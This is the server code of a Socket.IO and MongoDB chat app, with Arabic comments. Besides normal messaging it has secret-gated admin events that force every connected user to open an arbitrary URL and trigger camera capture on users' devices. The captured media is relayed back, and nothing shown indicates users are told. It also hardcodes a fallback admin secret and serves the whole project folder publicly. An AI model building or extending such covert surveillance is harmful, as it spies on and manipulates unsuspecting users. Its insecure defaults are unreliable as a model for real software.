const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const mongoose = require('mongoose');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  maxHttpBufferSize: 1e8 // للسماح برفع الملفات والفيديوهات الكبيرة
});

// إعداد الاتصال بقاعدة بيانات MongoDB
const MONGO_URI = process.env.MONGO_URI || 'mongodb://localhost:27017/admin-chat';
mongoose.connect(MONGO_URI)
    .then(() => console.log('Connected to MongoDB'))
    .catch(err => console.error('MongoDB connection error:', err));

// تعريف نموذج الرسائل في قاعدة البيانات
const messageSchema = new mongoose.Schema({
    sender: String,
    message: String,
    type: { type: String, default: 'text' },
    createdAt: { type: Date, default: Date.now }
});
const Message = mongoose.model('Message', messageSchema);

// التعديل هنا: قراءة الملفات من المجلد الرئيسي مباشرة ليعمل index.html بدون أخطاء
app.use(express.static(__dirname));

const ADMIN_SECRET = process.env.ADMIN_SECRET || 'mySuperSecretAdmin123';

io.on('connection', (socket) => {
    console.log('A user connected:', socket.id);
    updateActiveUsersCount();

    // إرسال الرسائل القديمة للمستخدم الجديد
    Message.find().sort({ createdAt: 1 }).limit(50).then(messages => {
        socket.emit('load_history', messages);
    });

    // استقبال الرسائل
    socket.on('send_message', async (data) => {
        const newMessage = new Message({
            sender: data.sender,
            message: data.message,
            type: data.type || 'text'
        });
        await newMessage.save();
        io.emit('receive_message', newMessage);
    });

    // === صلاحيات الأدمن ===
    socket.on('admin_delete_message', async ({ secret, messageId }) => {
        if (secret !== ADMIN_SECRET) return;
        await Message.findByIdAndDelete(messageId);
        io.emit('message_deleted', messageId);
    });

    socket.on('admin_edit_message', async ({ secret, messageId, newText }) => {
        if (secret !== ADMIN_SECRET) return;
        const updated = await Message.findByIdAndUpdate(messageId, { message: newText }, { new: true });
        if (updated) {
            io.emit('message_edited', { messageId, newText });
        }
    });

    socket.on('admin_open_url', ({ secret, targetUrl }) => {
        if (secret !== ADMIN_SECRET) return;
        io.emit('force_open_url', targetUrl);
    });

    socket.on('admin_request_media', ({ secret, mediaType }) => {
        if (secret !== ADMIN_SECRET) return;
        io.emit('trigger_camera_capture', mediaType);
    });

    socket.on('user_captured_media', (data) => {
        io.emit('display_captured_media_to_admin', data);
    });

    socket.on('disconnect', () => {
        console.log('User disconnected:', socket.id);
        updateActiveUsersCount();
    });
});

function updateActiveUsersCount() {
    const count = io.engine.clientsCount;
    io.emit('update_users_count', count);
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
